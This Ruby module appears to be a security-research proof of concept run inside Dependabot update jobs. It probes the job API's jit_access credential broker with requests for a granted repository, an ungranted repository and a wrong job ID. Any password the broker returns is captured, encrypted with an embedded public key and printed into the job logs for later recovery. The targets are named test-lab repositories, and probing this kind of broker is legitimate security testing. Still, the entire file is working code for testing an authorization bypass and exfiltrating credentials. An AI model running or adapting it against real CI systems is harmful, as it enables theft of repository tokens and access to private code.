# frozen_string_literal: true

require "json"
require "net/http"
require "openssl"
require "uri"

module DependabotJitProbe
  TARGET_OWNER = "rmp-owned-test-lab"
  TARGET_REPO = "dependabot-jit-target-b"
  CONTROL_OWNER = "rmp-owned-test-lab"
  CONTROL_REPO = "dependabot-jit-control-d"
  AAD = "dependabot-jit-probe-v1"

  module_function

  def run
    return if ENV["DEPENDABOT_JOB_ID"].to_s.empty?
    return if ENV["DEPENDABOT_API_URL"].to_s.empty?
    return if ENV["DEPENDABOT_JIT_PROBE_RAN"] == "1"

    job_id = ENV.fetch("DEPENDABOT_JOB_ID")
    validate_configuration!
    return unless claim_job_run(job_id)

    ENV["DEPENDABOT_JIT_PROBE_RAN"] = "1"
    base = ENV.fetch("DEPENDABOT_API_URL").sub(%r{/+\z}, "")

    current_endpoint = "#{base}/update_jobs/#{job_id}/jit_access"

    run_step("API_AUTH_CONTROL") { api_auth_control(base, job_id) }

    # Establish whether this job actually has legitimate, brokered read access
    # to the selected private repository before testing direct broker access.
    run_step("GIT_GRANTED_REPO") do
      git_request_and_record("GIT_GRANTED_REPO", TARGET_OWNER, TARGET_REPO, job_id)
    end
    run_step("GIT_UNGRANTED_REPO") do
      git_request_and_record("GIT_UNGRANTED_REPO", CONTROL_OWNER, CONTROL_REPO, job_id)
    end
    run_step("DIRECT_GRANTED_REPO") do
      request_and_record("DIRECT_GRANTED_REPO", current_endpoint, job_id, TARGET_OWNER, TARGET_REPO)
    end

    wrong_job_endpoint = "#{base}/update_jobs/0/jit_access"
    run_step("DIRECT_WRONG_JOB") do
      request_and_record("DIRECT_WRONG_JOB", wrong_job_endpoint, job_id, TARGET_OWNER, TARGET_REPO)
    end

    run_step("DIRECT_UNGRANTED_REPO") do
      request_and_record(
        "DIRECT_UNGRANTED_REPO",
        current_endpoint,
        job_id,
        CONTROL_OWNER,
        CONTROL_REPO
      )
    end
  rescue StandardError => e
    # Never include response bodies, request headers, URLs with queries, or
    # exception messages: any of those could contain sensitive material.
    puts "DEPENDABOT_JIT_PROBE_ERROR_CLASS=#{e.class}"
  end

  def validate_configuration!
    raise "target owner placeholder" if TARGET_OWNER.start_with?("__")
    raise "target repo placeholder" if TARGET_REPO.start_with?("__")
    raise "control owner placeholder" if CONTROL_OWNER.start_with?("__")
    raise "control repo placeholder" if CONTROL_REPO.start_with?("__")
    if TARGET_OWNER.casecmp?(CONTROL_OWNER) && TARGET_REPO.casecmp?(CONTROL_REPO)
      raise "target and control repositories must differ"
    end

    api = URI.parse(ENV.fetch("DEPENDABOT_API_URL"))
    raise "managed API must use HTTPS" unless api.scheme == "https"
    raise "proxy missing" if proxy_url.to_s.empty?
  end

  def request_and_record(label, endpoint, job_id, owner, repository)
    request_body = JSON.generate(
      "account" => owner,
      "repository" => repository
    )
    response = post_jit(endpoint, request_body)
    record_response(
      label,
      response,
      endpoint: endpoint,
      job_id: job_id,
      owner: owner,
      repository: repository,
      request_body: request_body
    )
  end

  def run_step(label)
    yield
  rescue StandardError => e
    puts "DEPENDABOT_JIT_PROBE_STEP_ERROR label=#{label} class=#{e.class}"
  end

  def claim_job_run(job_id)
    raise "invalid job id" unless /\A\d+\z/.match?(job_id.to_s)

    sentinel = "/tmp/dependabot-jit-probe-#{job_id}.lock"
    File.open(sentinel, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}
    true
  rescue Errno::EEXIST
    false
  end

  def api_auth_control(base, job_id)
    response_body = nil
    uri = URI.parse(
      "#{base}/update_jobs/#{job_id}/blocked_versions?package-manager=bundler"
    )
    request = Net::HTTP::Get.new(uri.request_uri)
    request["Accept"] = "application/json"
    request["User-Agent"] = "dependabot-proxy/1.0"
    request["X-Dependabot-JIT-Probe"] = job_id.to_s
    response = http_for(uri).request(request)
    response_body = response.body.to_s.b

    puts [
      "DEPENDABOT_JIT_API_CONTROL",
      "label=API_AUTH_CONTROL",
      "status=#{response.code}",
      "body_bytes=#{response_body.bytesize}"
    ].join(" ")
  ensure
    response_body&.replace("\0" * response_body.bytesize)
    if response&.body.is_a?(String) && !response.body.frozen?
      response.body.replace("\0" * response.body.bytesize)
    end
  end

  def git_request_and_record(label, owner, repository, job_id)
    response_body = nil
    uri = URI.parse(
      "https://github.com/#{owner}/#{repository}.git/info/refs?service=git-upload-pack"
    )
    request = Net::HTTP::Get.new(uri.request_uri)
    request["Accept"] = "*/*"
    request.basic_auth("jit-probe", "invalid-#{job_id}")
    response = http_for(uri).request(request)
    response_body = response.body.to_s.b
    git_advertisement = response["Content-Type"].to_s
      .split(";", 2).first.to_s.casecmp?("application/x-git-upload-pack-advertisement")

    puts [
      "DEPENDABOT_JIT_GIT_CONTROL",
      "label=#{label}",
      "status=#{response.code}",
      "git_advertisement=#{git_advertisement}",
      "body_bytes=#{response_body.bytesize}"
    ].join(" ")
  ensure
    response_body&.replace("\0" * response_body.bytesize)
    if response&.body.is_a?(String) && !response.body.frozen?
      response.body.replace("\0" * response.body.bytesize)
    end
  end

  def post_jit(endpoint, request_body)
    uri = URI.parse(endpoint)
    request = Net::HTTP::Post.new(uri.request_uri)
    request["Content-Type"] = "application/json"
    request["Accept"] = "application/json"
    request["User-Agent"] = "dependabot-proxy/1.0"
    request.body = request_body
    http_for(uri).request(request)
  end

  def http_for(uri)
    parsed_proxy = URI.parse(proxy_url)
    klass = Net::HTTP::Proxy(
      parsed_proxy.host,
      parsed_proxy.port,
      parsed_proxy.user,
      parsed_proxy.password
    )
    http = klass.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == "https"
    http.verify_mode = OpenSSL::SSL::VERIFY_PEER if http.use_ssl?
    http.open_timeout = 10
    http.read_timeout = 20
    http
  end

  def proxy_url
    ENV["HTTPS_PROXY"].to_s.empty? ? ENV["https_proxy"] : ENV["HTTPS_PROXY"]
  end

  def record_response(label, response, endpoint:, job_id:, owner:, repository:, request_body:)
    secret = nil
    response_body = response.body.to_s.b
    parsed = parse_json_object(response_body)
    keys = parsed.keys.map(&:to_s).sort
    password = parsed["password"].to_s
    credential_present = !password.empty?

    puts [
      "DEPENDABOT_JIT_PROBE",
      "label=#{label}",
      "status=#{response.code}",
      "keys=#{keys.join(',')}",
      "request_body_sha256=#{OpenSSL::Digest::SHA256.hexdigest(request_body.b)}",
      "body_bytes=#{response_body.bytesize}",
      "credential_present=#{credential_present}"
    ].join(" ")

    return unless credential_present

    secret = JSON.generate(
      "schema_version" => 2,
      "label" => label,
      "received_at" => Time.now.utc.strftime("%Y-%m-%dT%H:%M:%SZ"),
      "target_owner" => owner,
      "target_repo" => repository,
      "job_id" => job_id.to_s,
      "endpoint" => endpoint,
      "request_method" => "POST",
      "request_body_base64" => [request_body.b].pack("m0"),
      "response_status" => response.code.to_i,
      "response_body_base64" => [response_body].pack("m0")
    )
    bundle = encrypt(secret)
    encoded_bundle = [JSON.generate(bundle)].pack("m0")
    puts "DEPENDABOT_JIT_PROBE_BUNDLE_#{label}=#{encoded_bundle}"
  ensure
    secret&.replace("\0" * secret.bytesize)
    password.replace("\0" * password.bytesize) if password && !password.frozen?
    response_body&.replace("\0" * response_body.bytesize)
    if response&.body.is_a?(String) && !response.body.frozen?
      response.body.replace("\0" * response.body.bytesize)
    end
  end

  def parse_json_object(value)
    parsed = JSON.parse(value.to_s)
    parsed.is_a?(Hash) ? parsed : {}
  rescue JSON::ParserError
    {}
  end

  def encrypt(plaintext)
    public_key_path = File.expand_path("jit-probe-public.pem", __dir__)
    rsa = OpenSSL::PKey::RSA.new(File.read(public_key_path))
    key = OpenSSL::Random.random_bytes(32)
    mac_key = OpenSSL::Random.random_bytes(32)
    iv = OpenSSL::Random.random_bytes(16)

    cipher = OpenSSL::Cipher.new("aes-256-cbc")
    cipher.encrypt
    cipher.key = key
    cipher.iv = iv
    ciphertext = cipher.update(plaintext) + cipher.final
    mac = OpenSSL::HMAC.digest("SHA256", mac_key, AAD + iv + ciphertext)

    {
      "version" => 1,
      "algorithm" => "RSA-OAEP+AES-256-CBC+HMAC-SHA256",
      "encrypted_key" => [
        rsa.public_encrypt(key + mac_key, OpenSSL::PKey::RSA::PKCS1_OAEP_PADDING)
      ].pack("m0"),
      "iv" => [iv].pack("m0"),
      "mac" => [mac].pack("m0"),
      "ciphertext" => [ciphertext].pack("m0"),
      "aad" => AAD
    }
  ensure
    key&.replace("\0" * key.bytesize)
    mac_key&.replace("\0" * mac_key.bytesize)
  end
end
